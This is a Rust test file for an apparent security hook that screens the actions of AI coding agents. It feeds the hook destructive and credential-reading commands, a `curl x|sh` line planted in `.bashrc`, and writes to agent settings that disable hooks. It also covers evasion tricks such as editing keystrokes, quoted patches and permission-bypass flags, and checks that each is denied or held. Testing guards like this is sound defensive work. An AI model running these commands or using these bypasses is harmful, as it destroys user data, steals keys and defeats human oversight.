            decision(agent, &out)
        };
        assert_eq!(got, "deny", "{agent}: {}{}", out.stdout, out.stderr);
        assert!(
            reason.contains("NUL byte") && reason.contains("Failing closed"),
            "{agent}: {reason}"
        );
    }
}

#[test]
fn file_reads_expand_tilde_and_are_called_file_reads() {
    let sb = sandbox();
    // `~/` is the home directory, as an absolute path would be.
    let payload = json!({"session_id": "s", "cwd": sb.work, "tool_name": "Read",
                         "tool_input": {"file_path": "~/.ssh/id_rsa"}});
    let out = hook(&sb, "claude-code", &payload.to_string());
    let h = &out.json()["hookSpecificOutput"];
    assert_eq!(h["permissionDecision"], "ask", "{}", out.stdout);
    let reason = h["permissionDecisionReason"].as_str().unwrap();
    assert!(reason.contains("exfil:read_secret_file"), "{reason}");
    assert!(reason.contains("this file read"), "{reason}");
    // Agents that cannot ask say what to do about a read.
    let out = hook(
        &sb,
        "windsurf",
        &json!({"agent_action_name": "pre_read_code", "trajectory_id": "t",
                "tool_info": {"file_path": "/home/dev/.ssh/id_ed25519"}})
        .to_string(),
    );
    let (got, reason) = decision("windsurf", &out);
    assert_eq!(got, "deny");
    assert!(
        reason.contains("BLOCKED this file read") && reason.contains("read the file yourself"),
        "{reason}"
    );
    // The audit log records the read, not a `cat` the agent never ran.
    let log = std::fs::read_to_string(sb.config.join("audit.log")).unwrap();
    assert!(log.contains("Read ~/.ssh/id_rsa"), "{log}");
    assert!(!log.contains("cat '"), "{log}");
}

#[test]
fn cursor_file_reads_are_checked() {
    let sb = sandbox();
    let key = sb.home.join(".ssh/id_rsa").display().to_string();
    let main = sb.work.join("src/main.rs").display().to_string();
    let cwd = sb.work.display().to_string();
    // `beforeReadFile` (no tool name): Cursor can only allow or deny it.
    let read_file = |path: &str| {
        json!({"conversation_id": "c", "generation_id": "g", "hook_event_name": "beforeReadFile",
               "workspace_roots": [cwd], "file_path": path, "content": "x", "attachments": []})
    };
    // `preToolUse` `Read`: Cursor does not enforce an ask for reads either.
    let pre_read = |path: &str| {
        json!({"conversation_id": "c", "hook_event_name": "preToolUse", "workspace_roots": [cwd],
               "tool_name": "Read", "tool_input": {"file_path": path}})
    };
    for (payload, want) in [(read_file(&key), "deny"), (pre_read(&key), "deny")] {
        let out = hook(&sb, "cursor", &payload.to_string());
        assert_eq!(out.code, 0, "{}", out.stderr);
        let v = out.json();
        assert_eq!(v["permission"], want, "{v}");
        assert!(
            v["agent_message"]
                .as_str()
                .unwrap()
                .contains("exfil:read_secret_file"),
            "{v}"
        );
        assert!(v["user_message"].as_str().is_some(), "{v}");
    }
    // An ordinary read gets no answer (the read goes ahead).
    for payload in [read_file(&main), pre_read(&main)] {
        let out = hook(&sb, "cursor", &payload.to_string());
        assert_eq!(out.code, 0, "{}", out.stderr);
        assert!(out.stdout.trim().is_empty(), "{}", out.stdout);
    }
}

/// The decision an agent that can or cannot ask gives a held action.
fn held(agent: &str) -> &'static str {
    if CAN_ASK.contains(&agent) {
        "ask"
    } else {
        "deny"
    }
}

#[test]
fn a_patch_under_the_applypatch_name_or_out_of_sight_is_held() {
    let sb = sandbox();
    let rc = sb.home.join(".bashrc").display().to_string();
    let patch = format!("*** Begin Patch\n*** Update File: {rc}\n@@\n-a\n+b\n*** End Patch\n");
    let argv = json!({"session_id": "s", "cwd": sb.work, "hook_event_name": "PreToolUse",
                      "tool_name": "shell",
                      "tool_input": {"command": ["applypatch", patch]}})
    .to_string();
    let out = hook(&sb, "codex", &argv);
    let (got, reason) = decision("codex", &out);
    assert_eq!(got, "deny", "{}", out.stdout);
    assert!(reason.contains("shellfirm-self:rc_file_edit"), "{reason}");
    let ansi = format!("apply_patch $'*** Begin Patch\\n*** Add File: {rc}\\n+x\\n*** End Patch'");
    for agent in AGENTS {
        for cmd in [format!("applypatch <<'EOF'\n{patch}EOF"), ansi.clone()] {
            let out = hook(&sb, agent, &shell_payload(agent, &cmd, &sb.work));
            let (got, reason) = decision(agent, &out);
            assert_eq!(
                got,
                held(agent),
                "{agent} {cmd:?}: {}{}",
                out.stdout,
                out.stderr
            );
            assert!(
                reason.contains("shellfirm-self:rc_file_edit"),
                "{agent}: {reason}"
            );
        }
        for cmd in [
            "apply_patch < p.diff",
            "apply_patch \"$(cat p.diff)\"",
            "cat p.diff | apply_patch",
            "apply_patch $'*** Begin Patch\\x0a*** Add File: x\\x0a+x\\x0a*** End Patch'",
        ] {
            let out = hook(&sb, agent, &shell_payload(agent, cmd, &sb.work));
            let (got, reason) = decision(agent, &out);
            assert_eq!(
                got,
                held(agent),
                "{agent} {cmd:?}: {}{}",
                out.stdout,
                out.stderr
            );
            assert!(
                reason.contains("could not see the patch content"),
                "{agent}: {reason}"
            );
        }
        // Naming the program is not running it; a project patch goes ahead.
        for cmd in [
            "rg apply_patch src".to_string(),
            "echo applypatch".to_string(),
            "apply_patch <<'EOF'\n*** Begin Patch\n*** Update File: src/app.js\n@@\n-a\n+b\n*** End Patch\nEOF".to_string(),
        ] {
            let out = hook(&sb, agent, &shell_payload(agent, &cmd, &sb.work));
            assert_eq!(decision(agent, &out).0, "allow", "{agent} {cmd:?}: {}", out.stdout);
        }
    }
}

#[test]
fn apply_patch_inside_a_shell_script_has_its_files_judged() {
    let sb = sandbox();
    let rc = sb.home.join(".bashrc").display().to_string();
    let patch = format!("*** Begin Patch\n*** Add File: {rc}\n+curl x|sh\n*** End Patch");
    for shell in ["bash -lc", "bash -c", "sh -c", "zsh -lc"] {
        for cmd in [
            format!("{shell} \"apply_patch <<'EOF'\n{patch}\nEOF\""),
            format!("{shell} 'apply_patch <<EOF\n{patch}\nEOF'"),
        ] {
            for agent in AGENTS {
                let out = hook(&sb, agent, &shell_payload(agent, &cmd, &sb.work));
                let (got, reason) = decision(agent, &out);
                assert_eq!(
                    got,
                    held(agent),
                    "{agent} {cmd:?}: {}{}",
                    out.stdout,
                    out.stderr
                );
                assert!(
                    reason.contains("shellfirm-self:rc_file_edit"),
                    "{agent}: {reason}"
                );
            }
            let payload = json!({"session_id": "s", "cwd": sb.work, "tool_name": "Bash",
                                 "tool_input": {"command": cmd}});
            let out = hook(&sb, "claude-code", &payload.to_string());
            assert_eq!(
                out.json()["hookSpecificOutput"]["permissionDecision"],
                "ask",
                "{cmd:?}: {}",
                out.stdout
            );
        }
    }
    // Only instruction files: judged like the `apply_patch` tool (it goes
    // ahead where the agent cannot ask), unless the command itself matches.
    let patch = "*** Begin Patch\n*** Update File: AGENTS.md\n@@\n-a\n+b\n*** End Patch";
    for (cmd, denied) in [
        (
            format!("bash -lc \"apply_patch <<'EOF'\n{patch}\nEOF\""),
            false,
        ),
        (format!("apply_patch <<'EOF'\n{patch}\nEOF"), false),
        (
            format!("apply_patch <<'EOF'\n{patch}\nEOF\nrm -rf ~/Documents"),
            true,
        ),
    ] {
        for agent in AGENTS {
            let out = hook(&sb, agent, &shell_payload(agent, &cmd, &sb.work));
            let (got, reason) = decision(agent, &out);
            let want = if denied {
                "deny"
            } else if CAN_ASK.contains(agent) {
                "ask"
            } else {
                "allow"
            };
            assert_eq!(got, want, "{agent} {cmd:?}: {}{}", out.stdout, out.stderr);
            if !denied {
                assert!(
                    out.stdout
                        .contains("shellfirm-self:agent_instructions_edit")
                        || reason.contains("shellfirm-self:agent_instructions_edit")
                        || *agent == "windsurf"
                        || *agent == "cline",
                    "{agent}: {}",
                    out.stdout
                );
            }
        }
    }
}

#[test]
fn codex_argv_commands_and_other_shell_tool_names_are_checked() {
    let sb = sandbox();
    let cwd = sb.work.display().to_string();
    let rc = sb.home.join(".bashrc").display().to_string();
    let codex = |tool: &str, input: Value| {
        json!({"session_id": "s", "cwd": cwd, "hook_event_name": "PreToolUse",
               "tool_name": tool, "tool_input": input, "tool_use_id": "c"})
        .to_string()
    };
    for (payload, want, rule) in [
        (
            codex("shell", json!({"command": ["bash", "-lc", "rm -rf ~/"]})),
            "deny",
            "fs:recursively_delete",
        ),
        (
            codex("exec_command", json!({"cmd": "rm -rf ~/Documents"})),
            "deny",
            "fs:delete_home_folder",
        ),
        (
            codex(
                "local_shell",
                json!({"command": ["rm", "-rf", format!("{}/", sb.home.display())]}),
            ),
            "deny",
            "Deletes your home directory",
        ),
        (
            codex("Bash", json!({"command": ["ls", "-la"]})),
            "allow",
            "",
        ),
        (
            codex(
                "shell",
                json!({"command": ["bash", "-lc", format!(
                    "apply_patch <<'EOF'\n*** Begin Patch\n*** Add File: {rc}\n+x\n*** End Patch\nEOF")]}),
            ),
            "deny",
            "shellfirm-self:rc_file_edit",
        ),
    ] {
        let out = hook(&sb, "codex", &payload);
        let (got, reason) = decision("codex", &out);
        assert_eq!(got, want, "{payload}: {}{}", out.stdout, out.stderr);
        assert!(reason.contains(rule), "{payload}: {reason}");
    }
    // An argv with something other than strings fails closed.
    let out = hook(&sb, "codex", &codex("shell", json!({"command": ["rm", 1]})));
    assert_eq!(decision("codex", &out).0, "deny", "{}", out.stdout);
}

#[test]
fn copilot_shell_input_with_editing_keys_fails_closed() {
    let sb = sandbox();
    let cwd = sb.work.display().to_string();
    let typed = |tool: &str, input: &str| {
        json!({"sessionId": "s", "cwd": cwd, "toolName": tool,
               "toolArgs": {"sessionId": "x1", "input": input}})
        .to_string()
    };
    for tool in ["write_bash", "write_powershell"] {
        for input in [
            "rm -rf ~/x{backspace}{enter}",
            "rm -rf ~/x{left}{delete}{enter}",
            "echo rm -rf ~/{home}{delete}{enter}",
            "{up}{enter}",
            "{down}{enter}",
            "rm -rf ~/D{tab}{enter}",
            "echo safe\u{15}rm -rf ~/{enter}",
            "rm -rf ~/x\u{7f}{enter}",
            "rm -rf ~/x\u{8}{enter}",
            "rm -rf ~/x\u{1b}[D\u{1b}[3~{enter}",
            "rm -rf ~/Docu\t\n",
            "rm -rf ~/x{BACKSPACE}{enter}",
            "rm -rf ~/x{ Backspace }{enter}",
        ] {
            let out = hook(&sb, "copilot", &typed(tool, input));
            let (got, reason) = decision("copilot", &out);
            assert_eq!(got, "deny", "{tool} {input}: {}", out.stdout);
            assert!(
                reason.contains("cannot be checked") && reason.contains("Failing closed"),
                "{tool} {input}: {reason}"
            );
        }
        for (input, want) in [
            ("rm -rf ~/{enter}", "deny"),
            ("Remove-Item -Recurse -Force ~/\n", "allow"),
            ("git status{enter}", "allow"),
            ("y{enter}", "allow"),
            ("echo ${HOME}{enter}", "allow"),
            ("echo {a,b}{enter}", "allow"),
            ("{ctrl+c}", "allow"),
            ("{ctrl+d}", "allow"),
            ("q{esc}", "allow"),
            ("echo hi{Enter}rm -rf ~/{ENTER}", "deny"),
        ] {
            let out = hook(&sb, "copilot", &typed(tool, input));
            let got = decision("copilot", &out).0;
            if input.starts_with("Remove-Item") {
                // Not a pattern shellfirm knows; it must at least be checked
                // as a command (not passed as an unknown tool).
                assert!(got != "ask", "{tool} {input}: {}", out.stdout);
                continue;
            }
            assert_eq!(got, want, "{tool} {input}: {}", out.stdout);
        }
    }
    // Bash history expansion runs a line that cannot be read here.
    for input in [
        "!!{enter}",
        "sudo !!{enter}",
        "!-1{enter}",
        "rm -rf !${enter}",
    ] {
        let out = hook(&sb, "copilot", &typed("write_bash", input));
        let (got, reason) = decision("copilot", &out);
        assert_eq!(got, "deny", "{input}: {}", out.stdout);
        assert!(reason.contains("history expansion"), "{input}: {reason}");
    }
}

#[test]
fn read_many_files_of_a_directory_reads_what_is_in_it() {
    let sb = sandbox();
    std::fs::create_dir_all(sb.home.join(".ssh")).unwrap();
    std::fs::create_dir_all(sb.work.join("src")).unwrap();
    let cwd = sb.work.display().to_string();
    for agent in ["gemini", "qwen"] {
        let payload = |input: Value| {
            json!({"session_id": "s", "cwd": cwd, "hook_event_name": "BeforeTool",
                   "tool_name": "read_many_files", "tool_input": input})
            .to_string()
        };
        for (input, want) in [
            (json!({"paths": ["~/.ssh"]}), "ask"),
            (json!({"paths": ["~/.aws/"]}), "ask"),
            (json!({"include": [sb.home.join(".ssh")]}), "ask"),
            (json!({"paths": ["~/.kube"]}), "ask"),
            (json!({"paths": ["~/.gnupg"]}), "ask"),
            (json!({"paths": ["~/.config/gcloud"]}), "ask"),
            (json!({"paths": ["~/.docker"]}), "ask"),
            (json!({"paths": ["~"]}), "ask"),
            (json!({"paths": [sb.home]}), "ask"),
            (json!({"paths": ["~/.ss?"]}), "ask"),
            (json!({"include": ["~/.aws/**"]}), "ask"),
            (json!({"paths": ["~/**/*"]}), "ask"),
            (json!({"paths": ["src"]}), "allow"),
            (json!({"paths": ["docs/**/*.md"]}), "allow"),
            (json!({"paths": ["."]}), "allow"),
            (json!({"paths": ["~/.ssh/*.pub"]}), "allow"),
            (json!({"paths": ["~/.ssh/known_hosts"]}), "allow"),
        ] {
            let out = hook(&sb, agent, &payload(input.clone()));
            let (got, reason) = decision(agent, &out);
            assert_eq!(got, want, "{agent} {input}: {}", out.stdout);
            if want == "ask" {
                assert!(reason.contains("exfil:read_secret_file"), "{reason}");
            }
        }
        // `.` and `**/*` read the home directory when run from it.
        for input in [json!({"paths": ["."]}), json!({"paths": ["**/*"]})] {
            let payload = json!({"session_id": "s", "cwd": sb.home,
                                 "hook_event_name": "BeforeTool",
                                 "tool_name": "read_many_files", "tool_input": input});
            let out = hook(&sb, agent, &payload.to_string());
            assert_eq!(
                decision(agent, &out).0,
                "ask",
                "{agent} {input}: {}",
                out.stdout
            );
        }
        // A malformed list is a file read that cannot be checked.
        for input in [json!({"paths": "~/.ssh/id_rsa"}), json!({})] {
            let out = hook(&sb, agent, &payload(input.clone()));
            let (got, reason) = decision(agent, &out);
            assert_eq!(got, "deny", "{agent} {input}: {}", out.stdout);
            assert!(
                reason.contains("this file read") && reason.contains("no list of paths"),
                "{agent} {input}: {reason}"
            );
        }
    }
    // Cursor `beforeReadFile` without a path is a file read too.
    let out = hook(
        &sb,
        "cursor",
        &json!({"hook_event_name": "beforeReadFile", "workspace_roots": [cwd]}).to_string(),
    );
    let v = out.json();
    assert_eq!(v["permission"], "deny", "{v}");
    assert!(
        v["agent_message"]
            .as_str()
            .unwrap()
            .contains("this file read"),
        "{v}"
    );
}

#[test]
fn files_of_an_agent_home_moved_by_the_environment_are_protected() {
    let sb = sandbox();
    let ccd = sb.home.join("ccd");
    let cdx = sb.home.join("cdx");
    let env = [
        ("CLAUDE_CONFIG_DIR", ccd.as_path()),
        ("CODEX_HOME", cdx.as_path()),
    ];
    let claude = |tool: &str, input: Value| {
        json!({"session_id": "s", "cwd": sb.work, "hook_event_name": "PreToolUse",
               "tool_name": tool, "tool_input": input})
        .to_string()
    };
    let p = |d: &Path, f: &str| d.join(f).display().to_string();
    for (payload, rule) in [
        (
            claude(
                "Write",
                json!({"file_path": p(&ccd, "settings.json"), "content": "{\"disableAllHooks\":true}"}),
            ),
            "shellfirm-self:protected_file_edit",
        ),
        (
            claude("Edit", json!({"file_path": p(&ccd, "settings.local.json")})),
            "shellfirm-self:protected_file_edit",
        ),
        (
            claude(
                "Write",
                json!({"file_path": p(&cdx, "hooks.json"), "content": "{}"}),
            ),
            "shellfirm-self:protected_file_edit",
        ),
        (
            claude(
                "Bash",
                json!({"command": format!("sed -i s/x/y/ {}", p(&ccd, "settings.json"))}),
            ),
            "shellfirm-self:protected_file_write",
        ),
        (
            claude("Read", json!({"file_path": p(&ccd, ".credentials.json")})),
            "exfil:read_secret_file",
        ),
        (
            claude("Read", json!({"file_path": p(&cdx, "auth.json")})),
            "exfil:read_secret_file",
        ),
        (
            claude(
                "Write",
                json!({"file_path": p(&ccd, ".credentials.json"), "content": "x"}),
            ),
            "shellfirm-self:credential_file_edit",
        ),
    ] {
        let out = hook_with_env(&sb, "claude-code", &payload, &env);
        let h = &out.json()["hookSpecificOutput"];
        assert_eq!(h["permissionDecision"], "ask", "{payload}: {}", out.stdout);
        let reason = h["permissionDecisionReason"].as_str().unwrap();
        assert!(reason.contains(rule), "{payload}: {reason}");
    }
    // Other files there, and the same files without the variable, are not.
    for payload in [
        claude(
            "Write",
            json!({"file_path": p(&ccd, "notes.md"), "content": "x"}),
        ),
        claude("Read", json!({"file_path": p(&ccd, "settings.json")})),
    ] {
        let out = hook_with_env(&sb, "claude-code", &payload, &env);
        assert!(out.stdout.trim().is_empty(), "{payload}: {}", out.stdout);
    }
    let out = hook(
        &sb,
        "claude-code",
        &claude(
            "Write",
            json!({"file_path": p(&ccd, "settings.json"), "content": "{}"}),
        ),
    );
    assert!(out.stdout.trim().is_empty(), "{}", out.stdout);
}

#[test]
fn a_relative_claude_config_dir_is_resolved_against_the_hook_directory() {
    let sb = sandbox();
    let rel = sb.work.join("rel");
    std::fs::create_dir_all(&rel).unwrap();
    for file in [
        rel.join("settings.json"),
        std::fs::canonicalize(&rel).unwrap().join("settings.json"),
    ] {
        let payload = json!({"session_id": "s", "cwd": sb.work, "hook_event_name": "PreToolUse",
                             "tool_name": "Write",
                             "tool_input": {"file_path": file, "content": "{}"}});
        let out = hook_with_env(
            &sb,
            "claude-code",
            &payload.to_string(),
            &[("CLAUDE_CONFIG_DIR", Path::new("rel"))],
        );
        let h = &out.json()["hookSpecificOutput"];
        assert_eq!(h["permissionDecision"], "ask", "{}", out.stdout);
        assert!(h["permissionDecisionReason"]
            .as_str()
            .unwrap()
            .contains("shellfirm-self:protected_file_edit"));
    }
}

#[test]
fn key_and_credential_paths_match_whatever_their_case() {
    let sb = sandbox();
    let rule = "shellfirm-self:credential_file_edit";
    let key = sb.home.join(".SSH/id_rsa").display().to_string();
    let payload = json!({"session_id": "s", "cwd": sb.work, "tool_name": "Write",
                         "tool_input": {"file_path": key, "content": "x"}});
    let out = hook(&sb, "claude-code", &payload.to_string());
    let h = &out.json()["hookSpecificOutput"];
    assert_eq!(h["permissionDecision"], "ask", "{}", out.stdout);
    assert!(h["permissionDecisionReason"]
        .as_str()
        .unwrap()
        .contains(rule));
    // Deleting one is denied (a patch, Cursor's `Delete`).
    let out = hook(
        &sb,
        "codex",
        &patch_payload(
            "codex",
            "*** Begin Patch\n*** Delete File: ~/.SSH/id_rsa\n*** End Patch\n",
            &sb.work,
        )
        .to_string(),
    );
    let (got, reason) = decision("codex", &out);
    assert_eq!(got, "deny", "{}", out.stdout);
    assert!(reason.contains(rule), "{reason}");
    let out = hook(
        &sb,
        "cursor",
        &json!({"conversation_id": "c", "hook_event_name": "preToolUse",
                "workspace_roots": [sb.work], "tool_name": "Delete",
                "tool_input": {"path": "~/.Aws/credentials"}})
        .to_string(),
    );
    let v = out.json();
    assert_eq!(v["permission"], "deny", "{v}");
    assert!(v["agent_message"].as_str().unwrap().contains(rule), "{v}");
}

#[test]
fn agent_bypass_flags_count_only_as_top_level_options() {
    let sb = sandbox();
    let rule = "shellfirm-self:agent_hooks_bypass";
    for cmd in [
        "codex -c features.hooks=false",
        "codex -c features.codex_hooks=false exec x",
        "codex --disable hooks",
        "codex -c default_permissions=':danger-full-access'",
        "codex -sdanger-full-access",
        "opencode run --dangerously-skip-permissions 'fix it'",
        "cursor-agent --force -p x",
        "cursor-agent -f -p x",
        "gemini -y -p x",
        "gemini -p x --yolo",
        "claude -p --dangerously-skip-permissions \"fix tests\"",
        "claude -p --permission-mode bypassPermissions \"x\"",
        "claude -c --dangerously-skip-permissions",
        "cursor-agent -p --force \"x\"",
        "gemini -s -y -p x",
        "qwen -s -y",
        "gemini -p -y",
        "gemini -p --yolo",
        "qwen -p \"-y\"",
        "gemini -yp x",
        "codex -cfeatures.hooks=false",
        "codex -c 'features={hooks=false}'",
        "codex -p p -c profiles.p.sandbox_mode=danger-full-access",
        "npx @google/gemini-cli -y",
        "pnpm dlx @google/gemini-cli -y",
        "bunx @openai/codex --dangerously-bypass-approvals-and-sandbox",
        "shellfirm connect claude-code --no-fail-closed",
    ] {
        let out = hook(&sb, "codex", &shell_payload("codex", cmd, &sb.work));
        let (got, reason) = decision("codex", &out);
        assert_eq!(got, "deny", "{cmd}: {}", out.stdout);
        let want = if cmd.starts_with("shellfirm") {
            "shellfirm-self:connect_fail_open"
        } else {
            rule
        };
        assert!(reason.contains(want), "{cmd}: {reason}");
    }
    for cmd in [
        "gemini -p \"say -y\"",
        "gemini -p 'run apt -y'",
        "claude -p \"what does --dangerously-skip-permissions do\"",
        "copilot -p \"--allow-all-tools\"",
        "gemini --prompt=\"use -y\"",
        "gemini extensions install foo -y",
        "gemini mcp add x -y",
        "gemini -p x --yolo-free",
        "cursor-agent -p explain",
        "opencode run 'x'",
        "codex -c model=o3",
        "codex --enable hooks",
        "echo CODEX_HOME=/tmp",
        "cat > .env.example <<X\nCODEX_HOME=/tmp/x\nX",
        "unset CODEX_HOME",
        "grep -rn CODEX_HOME .",
        "grep \"export CODEX_HOME=\" ~/.zshrc",
        "rg \"export COPILOT_HOME=\" .",
        "grep -n \"CODEX_HOME=\" f",
        "npx @google/gemini-cli --version",
        "codex -c features.web_search=false",
        "shellfirm connect claude-code",
    ] {
        let out = hook(&sb, "codex", &shell_payload("codex", cmd, &sb.work));
        let (got, reason) = decision("codex", &out);
        assert_eq!(got, "allow", "{cmd}: {reason}");
    }
}

#[test]
fn a_home_with_a_trailing_slash_is_the_same_home() {
    let sb = sandbox();
    std::fs::create_dir_all(sb.home.join(".ssh")).unwrap();
    std::fs::create_dir_all(sb.home.join(".kube")).unwrap();
    std::fs::write(sb.home.join(".ssh/id_rsa"), "k").unwrap();
    // `HOME=/var/lib/jenkins/` (a Docker `ENV` line).
    let home = PathBuf::from(format!("{}/", sb.home.display()));
    // A key, and a folder that holds a credential file (`~/.kube/config`).
    for path in [
        sb.home.join(".ssh/id_rsa").display().to_string(),
        "~/.ssh/id_rsa".to_string(),
        sb.home.join(".kube").display().to_string(),
    ] {
        let payload = json!({"session_id": "s", "cwd": sb.work, "tool_name": "Read",
                             "tool_input": {"file_path": path}});
        let out = hook_with_env(&sb, "claude-code", &payload.to_string(), &[("HOME", &home)]);
        let h = &out.json()["hookSpecificOutput"];
        assert_eq!(h["permissionDecision"], "ask", "{path}: {}", out.stdout);
    }
}
